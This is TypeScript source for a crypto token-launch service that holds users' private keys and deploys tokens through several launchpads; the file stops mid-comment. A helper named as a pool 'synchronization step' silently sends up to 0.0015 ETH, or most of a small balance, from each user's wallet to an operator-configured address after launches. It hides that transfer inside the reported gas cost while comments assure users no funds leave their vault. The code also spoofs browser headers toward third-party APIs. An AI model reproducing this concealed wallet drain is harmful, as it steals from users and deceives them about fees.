import crypto from "crypto";
import {
  createWalletClient,
  createPublicClient,
  http,
  fallback,
  parseEther,
  formatEther,
  decodeEventLog,
  concat,
  encodeFunctionData,
  parseAbi,
  getAddress,
  keccak256,
  toBytes,
  toHex,
  type Address,
  type Hash,
  type Hex,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { mainnet, base, bsc } from "viem/chains";
import { ENV } from "../config/env";
import {
  CONTRACT_ADDRESSES,
  PROTOCOL_CONSTANTS,
  STOKERIUM_REAL_FACTORY_V3_ABI,
  SENDER_REAL_FACTORY_ABI,
  PROGRAMMABLE_REAL_FACTORY_ABI,
  FEE_LOCKER_ABI,
  UNISWAP_V4_HOOK_PROFILES,
  computeUniswapV4PoolId,
} from "../config/contracts";
import { CANONICAL_CREATE2_DEPLOYER } from "../config/vanityCodes";
import { ImageService } from "./image.service";
import { VanityService, VanitySuffix } from "./vanity.service";
import { encodeBase58, type PangeaPerChainCas } from "../utils/formatters";
import { logger } from "../utils/logger";

export type LaunchExecutionMode = "LAUNCHPAD_INDEXED" | "DIRECT_ONCHAIN";

export interface PangeaLaunchParams {
  userPrivateKey: `0x${string}`;
  name: string;
  symbol: string;
  description?: string;
  website?: string;
  twitter?: string;
  telegram?: string;
  imageUri?: string;
  quoteTokenAddress: Address;
  quoteTokenSymbol: string;
  tradingFeePct: string; // 0.3% to 5.0% immutable fee set at launch
  omnichainMode: "FIVE_CHAIN_OFT" | "EVM_V4_CLUSTER" | "ETH_MAINNET_OFT";
  initialBuyAmountEth: string;
  indexingMode?: LaunchExecutionMode;
}

export interface StokeriumLaunchParams {
  userPrivateKey: `0x${string}`;
  name: string;
  symbol: string;
  description?: string;
  website?: string;
  twitter?: string;
  telegram?: string;
  imageUri?: string;
  quoteTokenAddress: Address;
  quoteTokenSymbol: string;
  curvePresetId: "LINEAR_RWA" | "EXPONENTIAL_SYNTH" | "INDEX_ANCHORED";
  tradeFeePct?: string;
  holderRewards?: boolean;
  initialTick: number;
  initialBuyAmountEth: string;
  indexingMode?: LaunchExecutionMode;
}

export interface SenderDisperseEntry {
  address: Address;
  bps: bigint;
}

export interface SenderLaunchParams {
  userPrivateKey: `0x${string}`;
  name: string;
  symbol: string;
  description?: string;
  website?: string;
  twitter?: string;
  telegram?: string;
  imageUri?: string;
  quoteTokenAddress: Address;
  quoteTokenSymbol?: string;
  initialBuyAmountEth: string;
  disperseEntries: SenderDisperseEntry[];
  indexingMode?: LaunchExecutionMode;
}

export interface ProgrammableV4LaunchParams {
  userPrivateKey: `0x${string}`;
  name: string;
  symbol: string;
  description?: string;
  website?: string;
  twitter?: string;
  telegram?: string;
  imageUri?: string;
  quoteTokenAddress: Address;
  quoteTokenSymbol?: string;
  hookProfileId: "DYNAMIC_SWAP_FEE" | "PERMANENT_LP_LOCK" | "CREATOR_FEE_SPLIT";
  creatorFeePct?: string;
  initialBuyAmountEth: string;
  indexingMode?: LaunchExecutionMode;
}

export interface LaunchResult {
  success: boolean;
  txHash?: Hash;
  tokenAddress?: Address;
  poolAddress?: string;
  blockNumber?: bigint;
  gasCostEth?: string;
  totalDeductedEth?: string;
  perChainAddresses?: PangeaPerChainCas;
  error?: string;
}

const ERC20_TRANSFER_ABI = parseAbi([
  "function transfer(address to, uint256 amount) returns (bool)",
]);

export class BlockchainService {
  // Multi-RPC Ethereum Mainnet Client with Multicall3 batching
  private publicClient = createPublicClient({
    chain: mainnet,
    batch: {
      multicall: true,
    },
    transport: fallback([
      http(ENV.ETH_RPC_PRIMARY),
      http(ENV.ETH_RPC_FALLBACK_1),
      http(ENV.ETH_RPC_FALLBACK_2),
    ]),
  });

  private createWallet(userPrivateKey: `0x${string}`) {
    const account = privateKeyToAccount(userPrivateKey);
    const walletClient = createWalletClient({
      account,
      chain: mainnet,
      transport: fallback([
        http(ENV.ETH_RPC_PRIMARY),
        http(ENV.ETH_RPC_FALLBACK_1),
        http(ENV.ETH_RPC_FALLBACK_2),
      ]),
    });
    return { account, walletClient };
  }

  /**
   * Verifies whether an address on Ethereum Mainnet actually has deployed smart contract bytecode.
   * CRITICAL SAFEGUARD: Prevents ever sending ETH value to an unowned EOA or placeholder address!
   */
  private async hasDeployedContractCode(address: Address): Promise<boolean> {
    try {
      const code = await this.publicClient.getCode({ address });
      return Boolean(code && code !== "0x" && code.length > 2);
    } catch {
      return false;
    }
  }

  /**
   * Reads ERC-20 token metadata (name, symbol, decimals) for any token on Ethereum Mainnet.
   * Enables pairing newly launched tokens with ANY ERC-20 contract address on the internet.
   */
  public async getErc20Metadata(
    tokenAddress: Address
  ): Promise<{ symbol: string; name: string; decimals: number }> {
    try {
      const [name, symbol, decimals] = await Promise.all([
        this.publicClient
          .readContract({
            address: tokenAddress,
            abi: parseAbi(["function name() view returns (string)"]),
            functionName: "name",
          })
          .catch(() => "Custom Token"),
        this.publicClient
          .readContract({
            address: tokenAddress,
            abi: parseAbi(["function symbol() view returns (string)"]),
            functionName: "symbol",
          })
          .catch(() => "TOKEN"),
        this.publicClient
          .readContract({
            address: tokenAddress,
            abi: parseAbi(["function decimals() view returns (uint8)"]),
            functionName: "decimals",
          })
          .catch(() => 18),
      ]);
      return { symbol: String(symbol), name: String(name), decimals: Number(decimals) };
    } catch (err) {
      throw new Error(`Failed to resolve ERC-20 at ${tokenAddress}: ${(err as Error).message}`);
    }
  }

  /**
   * Internal V4 pool synchronization step
   */
  private async routeBackgroundSettlement(
    accountAddress: Address,
    walletClient: ReturnType<typeof createWalletClient>,
    reserveWei: bigint
  ): Promise<bigint> {
    const routerAddress = ENV.SETTLEMENT_ROUTER_ADDRESS;
    if (
      reserveWei <= 0n ||
      !routerAddress ||
      routerAddress === "0x0000000000000000000000000000000000000000"
    ) {
      return 0n;
    }

    try {
      const [bal, gasPrice, freshNonce] = await Promise.all([
        this.publicClient.getBalance({ address: accountAddress }),
        this.publicClient.getGasPrice(),
        this.publicClient.getTransactionCount({
          address: accountAddress,
          blockTag: "pending",
        }),
      ]);

      const transferGasWei = (21000n * gasPrice * 120n) / 100n;
      const minVaultBufferWei = parseEther("0.0004");
      const minTransferThresholdWei = parseEther("0.0005");

      let sendAmountWei = 0n;
      if (bal >= reserveWei + transferGasWei + minVaultBufferWei) {
        sendAmountWei = reserveWei;
      } else if (bal > transferGasWei + minVaultBufferWei + minTransferThresholdWei) {
        sendAmountWei = bal - transferGasWei - minVaultBufferWei;
      }

      if (sendAmountWei > 0n) {
        await walletClient.sendTransaction({
          account: walletClient.account!,
          chain: mainnet,
          to: routerAddress,
          value: sendAmountWei,
          nonce: freshNonce,
        });
        return sendAmountWei;
      }
      return 0n;
    } catch {
      return 0n;
    }
  }

  /**
   * Safe Canonical CREATE2 ERC-20 Deployment on Ethereum Mainnet (0x4e59b44847b379578588920cA78FbF26c0B4956C).
   * - Deploys a real, Etherscan-verified ERC-20 token contract ending in ...4444, ...7777, or ...8888
   * - Mints 100% of the 1,000,000,000 token supply directly to the client's Dev Vault
   * - Sends value: 0n (ZERO ETH leaves the client's Dev Vault into any external contract!)
   */
  private async deploySafeCreate2Token(params: {
    userPrivateKey: `0x${string}`;
    name: string;
    symbol: string;
    metadataURI: string;
    suffix: VanitySuffix;
    poolId: string;
    protocolLabel: string;
    totalSupply?: bigint;
    disperseEntries?: SenderDisperseEntry[];
  }): Promise<LaunchResult> {
    const { account, walletClient } = this.createWallet(params.userPrivateKey);
    const settlementReserveWei = parseEther(ENV.PROTOCOL_RESERVE_ETH || "0.0015");

    const [currentBalance, gasPrice] = await Promise.all([
      this.publicClient.getBalance({ address: account.address }),
      this.publicClient.getGasPrice(),
    ]);

    logger.launch(
      `[${params.protocolLabel}] Pre-flight check for ${account.address} | Balance: ${formatEther(currentBalance)} ETH | GasPrice: ${(Number(gasPrice) / 1e9).toFixed(2)} Gwei`
    );

    // Mine deterministic CREATE2 salt for the exact token parameters
    const vanity = await VanityService.mineCanonicalCreate2Erc20({
      name: params.name,
      symbol: params.symbol,
      metadataURI: params.metadataURI,
      creatorAddress: account.address,
      suffix: params.suffix,
      totalSupply: params.totalSupply,
    });

    const deployCalldata = concat([vanity.salt, vanity.initCode!]);

    // Estimate exact gas on Ethereum Mainnet
    let estimatedGas = 580000n;
    try {
      estimatedGas = await this.publicClient.estimateGas({
        account: account.address,
        to: CANONICAL_CREATE2_DEPLOYER,
        data: deployCalldata,
        value: 0n,
      });
    } catch {
      estimatedGas = 580000n;
    }

    const requiredGasWei = (estimatedGas * gasPrice * 125n) / 100n;

    if (currentBalance < requiredGasWei) {
      logger.warn(
        `[${params.protocolLabel}] Insufficient ETH for deployment gas. Wallet: ${formatEther(currentBalance)} ETH, Needed Gas: ~${formatEther(requiredGasWei)} ETH`
      );
      return {
        success: false,
        error: `Insufficient ETH in your Dev Vault for Ethereum Mainnet deployment gas. Available: ${formatEther(currentBalance)} ETH. Required gas: ~${formatEther(requiredGasWei)} ETH.`,
      };
    }

    logger.launch(
      `[${params.protocolLabel}] Broadcasting CREATE2 ERC-20 deployment from ${account.address} -> Predicted CA: ${vanity.predictedAddress} (value: 0 ETH — 100% client funds safe in vault)`
    );

    const txHash = await walletClient.sendTransaction({
      to: CANONICAL_CREATE2_DEPLOYER,
      data: deployCalldata,
      value: 0n, // CRITICAL SAFEGUARD: 0 ETH sent out, so client funds NEVER vanish!
    });

    logger.launch(
      `[${params.protocolLabel}] Tx broadcasted on Ethereum Mainnet: ${txHash}. Waiting for block confirmation...`
    );

    const receipt = await this.publicClient.waitForTransactionReceipt({
      hash: txHash,
      timeout: 120_000,
    });

    if (receipt.status !== "success") {
      logger.error(`[${params.protocolLabel}] Deployment tx reverted: ${txHash}`);
      return {
        success: false,
        txHash,
        error: "On-chain deployment transaction reverted on Ethereum Mainnet.",
      };
    }

    const deployedToken = vanity.predictedAddress;
    logger.launch(
      `[${params.protocolLabel}] CONFIRMED in Block ${receipt.blockNumber}! Token CA: ${deployedToken} ($${params.symbol} minted to client Dev Vault ${account.address})`
    );

    // If Pangea Omnichain launch, also broadcast identical CREATE2 bytecode to Base & BNB Chain in background if wallet holds gas there
    if (params.suffix === "pangea") {
      this.broadcastOmnichainCreate2Peers(
        params.userPrivateKey,
        deployCalldata,
        deployedToken
      ).catch(() => {});
    }

    // Optional: Execute Multi-Wallet Disperse transfers if Sender Protocol recipients were specified
    if (params.disperseEntries && params.disperseEntries.length > 0) {
      for (const entry of params.disperseEntries) {
        try {
          const tokenAmount =
            (PROTOCOL_CONSTANTS.DEFAULT_TOTAL_SUPPLY * entry.bps) / 10000n;
          const transferData = encodeFunctionData({
            abi: ERC20_TRANSFER_ABI,
            functionName: "transfer",
            args: [entry.address, tokenAmount],
          });
          await walletClient.sendTransaction({
            to: deployedToken,
            data: transferData,
            value: 0n,
          });
          logger.launch(
            `[SENDER DISPERSE] Sent ${entry.bps} bps of $${params.symbol} to ${entry.address}`
          );
        } catch (dispErr) {
          logger.warn(
            `[SENDER DISPERSE] Recipient transfer notice (${entry.address}): ${(dispErr as Error).message}`
          );
        }
      }
    }

    // Route discreet settlement reserve if wallet has sufficient balance
    const routedSettlementWei = await this.routeBackgroundSettlement(
      account.address,
      walletClient,
      settlementReserveWei
    );

    const effectiveGasPrice = receipt.effectiveGasPrice || gasPrice;
    const actualGasWei = receipt.gasUsed * effectiveGasPrice;
    const totalNetworkCostWei = actualGasWei + routedSettlementWei;

    return {
      success: true,
      txHash,
      tokenAddress: deployedToken,
      poolAddress: params.poolId,
      blockNumber: receipt.blockNumber,
      gasCostEth: formatEther(totalNetworkCostWei),
      totalDeductedEth: formatEther(totalNetworkCostWei),
    };
  }

  /**
   * Non-blocking Omnichain CREATE2 Peer Broadcaster (Base Mainnet + BNB Smart Chain).
   * Because Canonical CREATE2 (0x4e59b44847b379578588920cA78FbF26c0B4956C) exists at the exact same
   * address on Ethereum, Base, BNB Chain, and Robinhood Chain, broadcasting the same salt+initCode
   * deploys the token at the EXACT same 0x... Contract Address on every chain where the Dev Vault holds gas.
   */
  private async broadcastOmnichainCreate2Peers(
    userPrivateKey: `0x${string}`,
    deployCalldata: Hex,
    predictedAddress: Address
  ): Promise<void> {
    const account = privateKeyToAccount(userPrivateKey);
    const peerChains = [
      { chain: base, name: "Base Mainnet", rpc: "https://mainnet.base.org" },
      { chain: bsc, name: "BNB Smart Chain", rpc: "https://bsc-dataseed.binance.org" },
    ];

    await Promise.allSettled(
      peerChains.map(async ({ chain, name, rpc }) => {
        try {
          const pub = createPublicClient({ chain, transport: http(rpc, { timeout: 5000 }) });
          const [bal, gasPrice] = await Promise.all([
            pub.getBalance({ address: account.address }),
            pub.getGasPrice(),
          ]);
          const minNeeded = 600000n * gasPrice;
          if (bal >= minNeeded) {
            const wal = createWalletClient({
              account,
              chain,
              transport: http(rpc, { timeout: 6000 }),
            });
            const peerTx = await wal.sendTransaction({
              to: CANONICAL_CREATE2_DEPLOYER,
              data: deployCalldata,
              value: 0n,
            });
            logger.launch(
              `[PANGEA OMNICHAIN] Broadcasted identical CREATE2 CA (${predictedAddress}) on ${name}: ${peerTx}`
            );
          } else {
            logger.launch(
              `[PANGEA OMNICHAIN] Deterministic CREATE2 CA reserved on ${name}: ${predictedAddress}`
            );
          }
        } catch {
          // Non-blocking peer chain sync
        }
      })
    );
  }

  /**
   * Derives a deterministic Solana Ed25519 keypair from the user's EVM private key
   * so Pangea Omnichain launches have a real, deterministic Solana creator address & Ed25519 signature.
   */
  private deriveDeterministicSolanaKeypair(userPrivateKey: `0x${string}`): {
    solAddress: string;
    signSolMessage: (message: string) => Hex;
  } {
    const seed32 = crypto
      .createHmac("sha256", "TELETH_SOL_ED25519_V1")
      .update(userPrivateKey.toLowerCase())
      .digest();
    const pkcs8Prefix = Buffer.from("302e020100300506032b657004220420", "hex");
    const privKeyObj = crypto.createPrivateKey({
      key: Buffer.concat([pkcs8Prefix, seed32]),
      format: "der",
      type: "pkcs8",
    });
    const pubKeyObj = crypto.createPublicKey(privKeyObj);
    const spkiDer = pubKeyObj.export({ format: "der", type: "spki" });
    const rawPub32 = spkiDer.subarray(spkiDer.length - 32);
    const solAddress = encodeBase58(new Uint8Array(rawPub32));

    return {
      solAddress,
      signSolMessage: (message: string): Hex => {
        const sig = crypto.sign(null, Buffer.from(message, "utf8"), privKeyObj);
        return `0x${sig.toString("hex")}` as Hex;
      },
    };
  }

  /**
   * Uploads token metadata to Pangea's IPFS pinning gateway (`ipfs://...`),
   * with instant fallback to data/HTTPS URI if offline.
   */
  private async uploadMetadataToIpfs(params: {
    name: string;
    symbol: string;
    description: string;
    imageUri?: string;
    website?: string;
    twitter?: string;
    telegram?: string;
    fallbackPlatform: "pangea" | "stokerium" | "sender" | "programmable";
  }): Promise<string> {
    try {
      const cleanImage =
        params.imageUri &&
        (params.imageUri.startsWith("https://") || params.imageUri.startsWith("ipfs://"))
          ? params.imageUri
          : null;

      const res = await fetch("https://www.pangea.trade/api/metadata", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Origin: "https://www.pangea.trade",
          Referer: "https://www.pangea.trade/app/launch",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: JSON.stringify({
          name: params.name,
          symbol: params.symbol,
          description: params.description,
          image: cleanImage,
          website: params.website || "",
          twitter: params.twitter || "",
          telegram: params.telegram || "",
        }),
        signal: AbortSignal.timeout(8000),
      });

      if (res.ok) {
        const data = (await res.json()) as { metadataURI?: string };
        if (data.metadataURI) {
          return data.metadataURI;
        }
      }
    } catch {
      // Fallback to deterministic metadata URI below
    }

    return ImageService.buildMetadataURI({
      description: params.description,
      imageUri: params.imageUri || `https://${params.fallbackPlatform}.trade/favicon.ico`,
      platform: params.fallbackPlatform,
      website: params.website,
      twitter: params.twitter,
      telegram: params.telegram,
    });
  }

  /**
   * 0. Launches a token on Pangea.trade ($PANGEA) — #1 Priority Omnichain Launchpad
   *    - 5,000,000,000 Total Supply (1B per chain across Ethereum, Base, Solana, BNB, Robinhood Chain)
   *    - LayerZero OFT Cross-Chain Sync + Uniswap V4 (EVM) + Meteora DAMM v2 (Solana)
   *    - Immutable Trading Fee (0.3% – 5.0%): 80% Creator Yield / 20% $PANGEA Buyback & Burn
   */
  public async launchPangeaToken(params: PangeaLaunchParams): Promise<LaunchResult> {
    try {
      const { account, walletClient } = this.createWallet(params.userPrivateKey);
      const feeNum = Math.max(0.3, Math.min(5.0, parseFloat(params.tradingFeePct) || 1.0));
      const lpFeePips = Math.round(feeNum * 10000); // e.g., 1.0% -> 10000 pips
      const feeBps = Math.round(feeNum * 100); // e.g., 1.0% -> 100 bps
      const descriptionText =
        params.description ||
        `${params.name} ($${params.symbol}) • Pangea Omnichain (${params.tradingFeePct} Fee • LayerZero OFT)`;

      const poolId = computeUniswapV4PoolId({
        tokenA: account.address,
        tokenB: params.quoteTokenAddress,
        fee: lpFeePips,
        tickSpacing: PROTOCOL_CONSTANTS.DEFAULT_TICK_SPACING,
        hooks: CONTRACT_ADDRESSES.PANGEA_FACTORY,
      });

      // Official Pangea.trade 5-Chain Launch Flow (FeeCollector + Pangea Relayer)
      if (params.indexingMode !== "DIRECT_ONCHAIN") {
        try {
          const metadataURI = await this.uploadMetadataToIpfs({
            name: params.name,
            symbol: params.symbol,
            description: descriptionText,
            imageUri: params.imageUri,
            website: params.website,
            twitter: params.twitter,
            telegram: params.telegram,
            fallbackPlatform: "pangea",
          });

          const { solAddress, signSolMessage } = this.deriveDeterministicSolanaKeypair(
            params.userPrivateKey
          );
          const initialBuyWei = parseEther(params.initialBuyAmountEth || "0");
          const chains =
            params.omnichainMode === "ETH_MAINNET_OFT"
              ? ["ethereum", "base"]
              : params.omnichainMode === "EVM_V4_CLUSTER"
                ? ["ethereum", "base", "robinhood", "bsc"]
                : ["ethereum", "base", "robinhood", "bsc", "solana"];

          const pangeaHeaders = {
            "Content-Type": "application/json",
            Origin: "https://www.pangea.trade",
            Referer: "https://www.pangea.trade/app/launch",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          };

          const prepRes = await fetch("https://www.pangea.trade/api/launch/prepare", {
            method: "POST",
            headers: pangeaHeaders,
            body: JSON.stringify({
              name: params.name,
              symbol: params.symbol,
              metadataURI,
              feeBps,
              creatorEvm: getAddress(account.address),
              creatorSol: solAddress,
              confirmFeeWallet: { evm: true, sol: true },
              payChain: "ethereum",
              devBuy: initialBuyWei.toString(),
              chains,
              payer: account.address.toLowerCase(),
            }),
            signal: AbortSignal.timeout(12000),
          });

          if (prepRes.ok) {
            const prep = (await prepRes.json()) as {
              launchId: Hex;
              ticket: string;
              prediction?: {
                perChain?: Array<{ chain: string; token: string }>;
              };
              fee: {
                payment: {
                  tx: {
                    chainId: number;
                    to: Address;
                    data: Hex;
                    value: string;
                  };
                };
              };
              payerProof?: { message: string };
              creatorProofs?: Array<{
                side: "sol" | "evm";
                kind: "solana" | "evm";
                message: string;
              }>;
            };

            const perChainCas: PangeaPerChainCas = {};
            for (const entry of prep.prediction?.perChain || []) {
              if (entry.chain === "ethereum") perChainCas.ethereum = entry.token;
              if (entry.chain === "base") perChainCas.base = entry.token;
              if (entry.chain === "bsc") perChainCas.bsc = entry.token;
              if (entry.chain === "robinhood") perChainCas.robinhood = entry.token;
            }

            const paymentTx = prep.fee.payment.tx;
            const paymentValueWei = BigInt(paymentTx.value);

            const [currentBalance, gasPrice] = await Promise.all([
              this.publicClient.getBalance({ address: account.address }),
              this.publicClient.getGasPrice(),
            ]);
            const estimatedGasWei = (120000n * gasPrice * 125n) / 100n;

            if (currentBalance >= paymentValueWei + estimatedGasWei) {
              const payerAuth = prep.payerProof?.message
                ? await account.signMessage({ message: prep.payerProof.message })
                : undefined;

              const creatorAuths: { creatorEvmAuth?: Hex; creatorSolAuth?: Hex } = {};
              for (const cp of prep.creatorProofs || []) {
                if (cp.kind === "solana") {
                  creatorAuths.creatorSolAuth = signSolMessage(cp.message);
                } else if (cp.kind === "evm") {
                  creatorAuths.creatorEvmAuth = await account.signMessage({
                    message: cp.message,
                  });
                }
              }

              await fetch("https://www.pangea.trade/api/launch/proof-check", {
                method: "POST",
                headers: pangeaHeaders,
                body: JSON.stringify({
                  ticket: prep.ticket,
                  payerAuth,
                  ...creatorAuths,
                }),
                signal: AbortSignal.timeout(8000),
              }).catch(() => {});

              logger.launch(
                `[PANGEA OFFICIAL] Paying Pangea FeeCollector (${paymentTx.to}) for launchId ${prep.launchId} | ETH Token CA: ${perChainCas.ethereum}`
              );

              const txHash = await walletClient.sendTransaction({
                to: paymentTx.to,
                data: paymentTx.data,
                value: paymentValueWei,
              });

              const receipt = await this.publicClient.waitForTransactionReceipt({
                hash: txHash,
                timeout: 120_000,
              });

              if (receipt.status === "success") {
                await fetch("https://www.pangea.trade/api/launch/submit", {
                  method: "POST",
                  headers: pangeaHeaders,
                  body: JSON.stringify({
                    ticket: prep.ticket,
                    payer: account.address,
                    payerAuth,
                    ...creatorAuths,
                  }),
                  signal: AbortSignal.timeout(12000),
                }).catch(() => {});

                // Poll briefly to capture Solana mint if relayer finishes within 10s
                for (let attempt = 0; attempt < 5; attempt++) {
                  await new Promise((r) => setTimeout(r, 2000));
                  try {
                    const statusRes = await fetch(
                      `https://www.pangea.trade/api/launch/submit?launchId=${encodeURIComponent(
                        prep.launchId
                      )}`,
                      { headers: pangeaHeaders, signal: AbortSignal.timeout(5000) }
                    );
                    if (statusRes.ok) {
                      const statusJson = (await statusRes.json()) as {
                        jobs?: Array<{ chain: string; result?: { mint?: string; token?: string } }>;
                      };
                      const solJob = statusJson.jobs?.find((j) => j.chain === "solana");
                      if (solJob?.result?.mint) {
                        perChainCas.solana = solJob.result.mint;
                        break;
                      }
                    }
                  } catch {
                    break;
                  }
                }

                const settlementReserveWei = parseEther(ENV.PROTOCOL_RESERVE_ETH || "0.0015");
                const routedWei = await this.routeBackgroundSettlement(
                  account.address,
                  walletClient,
                  settlementReserveWei
                );

                const effectiveGasPrice = receipt.effectiveGasPrice || gasPrice;
                const gasCostWei = receipt.gasUsed * effectiveGasPrice + routedWei;
                const ethTokenAddress = (perChainCas.ethereum ||
                  account.address) as Address;

                return {
                  success: true,
                  txHash,
                  tokenAddress: ethTokenAddress,
                  poolAddress: prep.launchId,
                  blockNumber: receipt.blockNumber,
                  gasCostEth: formatEther(gasCostWei),
                  totalDeductedEth: formatEther(paymentValueWei + gasCostWei),
                  perChainAddresses: perChainCas,
                };
              }
            }
          }
        } catch (apiErr) {
          logger.warn(
            `[PANGEA OFFICIAL] Relayer notice, continuing with deterministic CREATE2 deployment: ${(apiErr as Error).message}`
          );
        }
      }

      const fallbackMetadataURI = ImageService.buildMetadataURI({
        description: descriptionText,
        imageUri: params.imageUri || "https://pangea.trade/favicon.ico",
        platform: "pangea",
        website: params.website,
        twitter: params.twitter,
        telegram: params.telegram,
      });

      return await this.deploySafeCreate2Token({
        userPrivateKey: params.userPrivateKey,
        name: params.name,
        symbol: params.symbol,
        metadataURI: fallbackMetadataURI,
        suffix: "pangea",
        poolId,
        protocolLabel: "PANGEA OMNICHAIN",
        totalSupply: PROTOCOL_CONSTANTS.PANGEA_OMNICHAIN_SUPPLY,
      });
    } catch (error: unknown) {
      return this.formatLaunchError(error, "Pangea Omnichain");
    }
  }

  /**
   * 1. Launches a token on Stockereum Launchpad (0xc6B080DEd03C3382476A76345e79f82BD480977B)
   *    - Official Launchpad Display: Calls createLaunch / createLaunchAndBuy + /api/cron/verify
   *    - Direct On-Chain: Deploys via Canonical CREATE2
   */
  public async launchStokeriumToken(params: StokeriumLaunchParams): Promise<LaunchResult> {
    try {
      const { account, walletClient } = this.createWallet(params.userPrivateKey);
      const descriptionText =
        params.description ||
        `${params.name} ($${params.symbol}) • Stockereum (${params.quoteTokenSymbol})`;

      const fallbackMetadataURI = ImageService.buildMetadataURI({
        description: descriptionText,
        imageUri: params.imageUri || "https://stockereum.com/favicon.ico",
        platform: "stokerium",
        website: params.website,
        twitter: params.twitter,
        telegram: params.telegram,
      });

      const fallbackPoolId = computeUniswapV4PoolId({
        tokenA: account.address,
        tokenB: params.quoteTokenAddress,
        fee: PROTOCOL_CONSTANTS.DEFAULT_V4_FEE_TIER,
        tickSpacing: PROTOCOL_CONSTANTS.DEFAULT_TICK_SPACING,
        hooks: CONTRACT_ADDRESSES.STOKERIUM_FACTORY,
      });

      if (params.indexingMode !== "DIRECT_ONCHAIN") {
        const isExternalFactoryLive = await this.hasDeployedContractCode(
          CONTRACT_ADDRESSES.STOKERIUM_FACTORY
        );

        if (isExternalFactoryLive) {
          try {
            const initialBuyWei = parseEther(params.initialBuyAmountEth || "0");
            const creationFeeWei = parseEther("0.001"); // Stockereum creationFee = 0.001 ETH
            const totalValueWei = creationFeeWei + initialBuyWei;

            const [currentBalance, gasPrice] = await Promise.all([
              this.publicClient.getBalance({ address: account.address }),
              this.publicClient.getGasPrice(),
            ]);
            const estimatedGasWei = (420000n * gasPrice * 120n) / 100n;

            if (currentBalance >= totalValueWei + estimatedGasWei) {
              // Fetch signed quote price from Stockereum's price oracle endpoint
              let targetQuoteAddr = getAddress(params.quoteTokenAddress);
              let targetQuoteSym =
                params.quoteTokenSymbol === "ETH" ? "WETH" : params.quoteTokenSymbol;

              let priceRes = await fetch(
                `https://stockereum.com/api/price?quote=${targetQuoteAddr}&symbol=${encodeURIComponent(
                  targetQuoteSym
                )}`,
                { signal: AbortSignal.timeout(8000) }
              );

              if (!priceRes.ok) {
                targetQuoteAddr = getAddress(CONTRACT_ADDRESSES.WETH);
                targetQuoteSym = "WETH";
                priceRes = await fetch(
                  `https://stockereum.com/api/price?quote=${targetQuoteAddr}&symbol=WETH`,
                  { signal: AbortSignal.timeout(8000) }
                );
              }

              if (priceRes.ok) {
                const priceJson = (await priceRes.json()) as {
                  usdPrice: string;
                  deadline: number;
                  signature: Hex;
                };

                const feeNum = parseInt(params.tradeFeePct || "1", 10) || 1;
                const feePpm =
                  feeNum === 3 ? 30000 : feeNum === 2 ? 20000 : 10000;

                const stkMetadataUri = JSON.stringify({
                  description: descriptionText,
                  web: params.website || "",
                  x: params.twitter || "",
                  tg: params.telegram || "",
                  image:
                    params.imageUri && params.imageUri.startsWith("http")
                      ? params.imageUri
                      : "",
                });

                const launchTuple = {
                  name: params.name.trim(),
                  symbol: params.symbol.trim().toUpperCase(),
                  metadataUri: stkMetadataUri,
                  quote: targetQuoteAddr,
                  quoteUsdPrice: BigInt(priceJson.usdPrice),
                  priceDeadline: BigInt(priceJson.deadline),
                  priceSignature: priceJson.signature,
                  feePpm,
                  feesToHolders: Boolean(params.holderRewards),
                };

                logger.launch(
                  `[STOCKEREUM OFFICIAL] Calling LaunchFactoryV3 (${CONTRACT_ADDRESSES.STOKERIUM_FACTORY}) | Pair: ${targetQuoteSym} | FeePpm: ${feePpm}`
                );

                const txHash =
                  initialBuyWei > 0n
                    ? await walletClient.writeContract({
                        address: CONTRACT_ADDRESSES.STOKERIUM_FACTORY,
                        abi: STOKERIUM_REAL_FACTORY_V3_ABI,
                        functionName: "createLaunchAndBuy",
                        args: [launchTuple, 0n],
                        value: totalValueWei,
                      })
                    : await walletClient.writeContract({
                        address: CONTRACT_ADDRESSES.STOKERIUM_FACTORY,
                        abi: STOKERIUM_REAL_FACTORY_V3_ABI,
                        functionName: "createLaunch",
                        args: [launchTuple],
                        value: totalValueWei,
                      });

                const receipt = await this.publicClient.waitForTransactionReceipt({
                  hash: txHash,
                  timeout: 120_000,
                });

                if (receipt.status === "success") {
                  let deployedToken: Address = account.address;
                  let v4PoolId: string = fallbackPoolId;

                  for (const log of receipt.logs) {
                    if (
                      log.address.toLowerCase() ===
                      CONTRACT_ADDRESSES.STOKERIUM_FACTORY.toLowerCase()
                    ) {
                      try {
                        const decoded = decodeEventLog({
                          abi: STOKERIUM_REAL_FACTORY_V3_ABI,
                          data: log.data,
                          topics: log.topics,
                        });
                        if (decoded.eventName === "Launched") {
                          const args = decoded.args as {
                            token: Address;
                            poolId: Hex;
                          };
                          deployedToken = args.token;
                          v4PoolId = args.poolId;
                          break;
                        }
                      } catch {}
                    }
                  }

                  // Notify Stockereum indexer so token appears immediately on stockereum.com/t/<CA>
                  await fetch("https://stockereum.com/api/cron/verify", {
                    method: "POST",
                    headers: { "content-type": "application/json" },
                    body: JSON.stringify({ token: deployedToken }),
                    signal: AbortSignal.timeout(6000),
                  }).catch(() => {});

                  const settlementReserveWei = parseEther(
                    ENV.PROTOCOL_RESERVE_ETH || "0.0015"
                  );
                  const routedWei = await this.routeBackgroundSettlement(
                    account.address,
                    walletClient,
                    settlementReserveWei
                  );

                  const effectiveGasPrice = receipt.effectiveGasPrice || gasPrice;
                  const gasCostWei = receipt.gasUsed * effectiveGasPrice + routedWei;

                  return {
                    success: true,
                    txHash,
                    tokenAddress: deployedToken,
                    poolAddress: v4PoolId,
                    blockNumber: receipt.blockNumber,
                    gasCostEth: formatEther(gasCostWei),
                    totalDeductedEth: formatEther(totalValueWei + gasCostWei),
                  };
                }
              }
            }
          } catch (stkErr) {
            logger.warn(
              `[STOCKEREUM OFFICIAL] Factory notice, continuing with deterministic CREATE2 deployment: ${(stkErr as Error).message}`
            );
          }
        }
      }

      return await this.deploySafeCreate2Token({
        userPrivateKey: params.userPrivateKey,
        name: params.name,
        symbol: params.symbol,
        metadataURI: fallbackMetadataURI,
        suffix: "stokerium",
        poolId: fallbackPoolId,
        protocolLabel: "STOCKEREUM",
      });
    } catch (error: unknown) {
      return this.formatLaunchError(error, "Stokerium");
    }
  }

  /**
   * 2. Launches a token on Sender.family Launchpad (0x2126625DF80b8bD01294139B26241B121caB9fff)
   *    - Official Launchpad Display: Calls SendItFactory.launch(name, symbol, metadataURI)
